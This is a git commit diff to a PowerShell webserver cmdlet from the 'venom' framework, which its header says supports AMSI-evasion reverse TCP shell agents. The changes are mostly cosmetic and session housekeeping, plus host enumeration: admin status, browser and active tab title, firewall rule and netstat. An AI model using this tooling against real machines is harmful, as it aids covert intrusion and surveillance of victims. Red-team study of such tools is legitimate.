a4b7c1d7f22093bc48dc4f8f25710d4ef9067419
root <root@localhost.localdomain>
2020-11-23 11:33:19 +0000

    venom v1.0.17.6 - CmdLet -Replace multiple PID's from sessions.log

--- aux/webserver.ps1
+++ aux/webserver.ps1
@@ -6,7 +6,7 @@
    Tested Under: Windows 10 - Build 18363
    Required Dependencies: python (http.server)
    Optional Dependencies: curl|Start-BitsTransfer
-   PS cmdlet Dev version: v1.12
+   PS cmdlet Dev version: v1.13
 
 .DESCRIPTION
    This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
@@ -130,7 +130,7 @@
 )
 
 $HiddeMsgBox = $False
-$CmdletVersion = "v1.12"
+$CmdletVersion = "v1.13"
 $Initial_Path = (pwd).Path
 $Server_hostName = (hostname)
 $Server_Working_Dir = "$SPath"
@@ -150,8 +150,8 @@ $Banner = @"
  :::  ===  === :::      :::  === :::     :::      :::  === :::  === :::      :::  ===
  ===  ===  === ======   =======   =====  ======   =======  ===  === ======   ======= 
   ===========  ===      ===  ===     === ===      === ===   ======  ===      === === 
-   ==== ====   ======== =======  ======  ======== ===  ===    ==    ======== ===  === $CmdletVersion
-          Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA RedTeam@2020}
+   ==== ====   ======== =======  ======  ======== ===  ===    ==    ======== ===  ===
+        Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA@RedTeam} $CmdletVersion
 
 "@;
 Clear-Host;
@@ -160,7 +160,7 @@ Write-Host $Banner;
 If($SKill -gt 0){
 $Count = 0 ## Loop counter 
 If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False'){
-   write-host "[warning] -SKill parameter can not be used with other parameters .." -ForeGroundColor Yellow
+   write-host "[warning] -SKill parameter can not be used together with other parameters .." -ForeGroundColor Yellow
    Start-Sleep -Seconds 1
 }
 
@@ -192,8 +192,8 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    }
 
    ## Create data table for output
-   foreach($KeyId in $TablePid){$Count++
-      $CloseTime = Get-Date -Format 'HH:mm:ss';Start-Sleep -Seconds 1
+   foreach($KeyId in $TablePid){
+      $Count++;$CloseTime = Get-Date -Format 'HH:mm:ss';Start-Sleep -Seconds 1
       Write-Host "$Count   $TableName   $ServerVersion    $KeyId  $CloseTime"
    }
    If(Test-Path "$Env:TMP\sessions.log"){Remove-Item $Env:TMP\sessions.log -Force}
@@ -204,7 +204,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
 If($Sessions -ieq "List" -or $Sessions -Match '^\d+$'){
 $Count = 0 ## Loop counter
 If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $SKill -ne '0'){
-   write-host "[warning] -Sessions parameter can not be used with other parameters .." -ForeGroundColor Yellow
+   write-host "[warning] -Sessions parameter can not be used together with other parameters .." -ForeGroundColor Yellow
    Start-Sleep -Seconds 1
 }
 
@@ -234,15 +234,15 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
          Write-Host "$Count   $KeyId"
       }
    }Else{
-      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName" -ForeGroundColor DarkRed -BackgroundColor Cyan 
+      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName`n" -ForeGroundColor DarkRed -BackgroundColor Cyan 
+      exit ## exit @webserver
    }
 
    ## Kill Process by is PID number
    If($Sessions -Match '^\d+$'){
       Write-Host "`nKilling Process PID: $Sessions" -ForegroundColor DarkGreen
-      $PidExists = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id
-      ## Make sure that python process PID exists
-      If($PidExists -Match "$Sessions"){
+      $CheckIfPidExist = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id
+      If($CheckIfPidExist -Match "$Sessions"){
          cmd /c taskkill /F /PID $Sessions;Start-Sleep -Seconds 1
          Write-Host "`nCurrently active session process(s)" -ForegroundColor Yellow
          Write-Host "ProcessName                   PID  SessionName                Session MemUsage" -ForegroundColor DarkGreen
@@ -251,7 +251,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
          ## Delete session PID Number from sessions.log file
          $GrabPidIdentifier = Get-Content "$Env:TMP\sessions.log"|findstr /C:"$Sessions"
          $SessionPidDeletion = $GrabPidIdentifier[0,1,2,3] -Join ''
-         ((Get-Content -Path "$Env:TMP\sessions.log" -Raw) -Replace "$SessionPidDeletion","****")|Set-Content -Path "$Env:TMP\sessions.log"  -NoNewline -Force
+         ((Get-Content -Path "$Env:TMP\sessions.log" -Raw|Select-String "$Sessions") -Replace "$Sessions","****")|Set-Content -Path "$Env:TMP\sessions.log" -Force
       }Else{
          Write-Host "[fail] PID: $Sessions Not found" -ForeGroundColor DarkRed -BackGroundColor Cyan
       }
@@ -459,7 +459,6 @@ If(-not($Installation) -or $Installation -ieq $null){
 }Else{
 
    write-host "All Python requirements are satisfied." -ForeGroundColor Green
-   Start-Sleep -Seconds 1
    If(-not($SBind) -or $SBind -ieq $null){
       ## Grab remote target IPv4 ip address (to --bind)
       $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
@@ -544,6 +543,8 @@ If(-not($Installation) -or $Installation -ieq $null){
       ## Internal Variable Declarations
       $SSID = (Get-WmiObject Win32_OperatingSystem).Caption
       $OsVersion = (Get-WmiObject Win32_OperatingSystem).Version
+      $FirewallRule = netsh advfirewall firewall show rule name="python.exe"|findstr "Rule Name:"
+      $FirewallState = netsh advfirewall firewall show rule name="python.exe"|findstr "Enabled:"
       $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
       $recon_age = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
       $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");If($IsClientAdmin){$report = "Administrator"}Else{$report = "UserLand"}
@@ -553,6 +554,8 @@ If(-not($Installation) -or $Installation -ieq $null){
       $Browserversion = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty ProductVersion
       $StoreData = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -ExpandProperty MainWindowTitle
       $ActiveTabName = $StoreData | where {$_ -ne ""}
+      $dataone = $FirewallRule -replace 'Rule Name:                            ',''
+      $datatwo = $FirewallState -replace 'Enabled:                              ','' 
 
          ## WebBrowser Headers Enumeration (pure powershell)
          $Url = "http://${Remote_Host}:${Remote_Server_Port}/"
@@ -569,16 +572,18 @@ If(-not($Installation) -or $Installation -ieq $null){
          ## Build output Table
          Write-Host "Enumeration"
          write-host "-----------"
-         write-host "Shell Privs    : $report"
-         write-host "Remote Host    : $Remote_Host"
-         Write-Host "LogonServer    : ${Env:USERDOMAIN}\\${Env:USERNAME}"
-         write-host "OS version     : $OsVersion"
-         write-host "OperatingSystem: $SSID"
-         write-host "DefaultBrowser : $Parse_Browser_Data ($Browserversion)"
-         write-host "User-Agent     : $recon_age"
-         write-host "WebBrowserPath : $BrowserPath"
-         write-host "ActiveTabName  : $ActiveTabName"
-         write-host "WebServerTitle : $WebTitle`n"
+         write-host "Shell Privs      : $report"
+         write-host "Remote Host      : $Remote_Host"
+         Write-Host "LogonServer      : ${Env:USERDOMAIN}\\${Env:USERNAME}"
+         write-host "OS version       : $OsVersion"
+         write-host "DefaultBrowser   : $Parse_Browser_Data ($Browserversion)"
+         write-host "OperatingSystem  : $SSID"
+         write-host "User-Agent       : $recon_age"
+         write-host "WebBrowserPath   : $BrowserPath"
+         write-host "ActiveTabName    : $ActiveTabName"
+         write-host "WebServerTitle   : $WebTitle"
+         write-host "FirewallRuleName : $dataone"
+         write-host "RuleEnabledStatus: $datatwo`n"
 
       ## TCP Connections enumeration
       echo "" > $Env:TMP\logfile.log
@@ -592,35 +597,6 @@ If(-not($Installation) -or $Installation -ieq $null){
       echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
       cmd /c netstat -ano|findstr "ESTABLISHED"|findstr /V "::"|findstr /V "["|findstr /V "UDP" >> $Env:TMP\logfile.log
       Get-Content $Env:TMP\logfile.log;Remove-Item $Env:TMP\logfile.log -Force
-
-      ## Display webserver firewall rule
-      netsh advfirewall firewall show rule name="python.exe"|Out-Null
-      If($LASTEXITCODE -eq 0){
-         $FirewallRule = netsh advfirewall firewall show rule name="python.exe"|findstr "Rule Name:"
-         $FirewallProfile = netsh advfirewall firewall show rule name="python.exe"|findstr "Profiles:"
-         $FirewallState = netsh advfirewall firewall show rule name="python.exe"|findstr "Enabled:"
-         $FirewallDirection = netsh advfirewall firewall show rule name="python.exe"|findstr "Direction:"
-         $FirewallProto = netsh advfirewall firewall show rule name="python.exe"|findstr "Protocol:"
-         $FirewallAction = netsh advfirewall firewall show rule name="python.exe"|findstr "Action:"
-         $dataone = $FirewallRule -replace '                           ',''
-         $datatwo = $FirewallState -replace ':                              ','  : '
-         $datatre = $FirewallDirection -replace '                           ',''
-         $datafour = $FirewallProfile -replace ':                            ',' :'
-         $datafive = $FirewallProto -replace ':                            ',' :'
-         $datasix = $FirewallAction -replace ':                              ','   :'
-         Write-Host "`nWebserver firewall rule"
-         Write-Host "-----------------------"
-         Write-Host "  $dataone"
-         Write-Host "  $datafour"
-         Write-Host "  $datasix"
-         Write-Host "  $datafive"
-         Write-Host "  $datatwo"
-         Write-Host "  $datatre`n"
-      }Else{
-         Write-Host "`nWebserver firewall rule"
-         Write-Host "-----------------------"
-         Write-Host "  [fail] @webserver cant find the firewall rule`n" -ForegroundColor DarkRed -BackgroundColor Cyan
-      }
    }
 }
 
@@ -630,5 +606,4 @@ If(-not($Installation) -or $Installation -ieq $null){
 If(Test-Path "$Env:TMP\$BinName"){Remove-Item "$Env:TMP\$BinName" -Force}
 Start-Sleep -Seconds 1
 exit
-
 
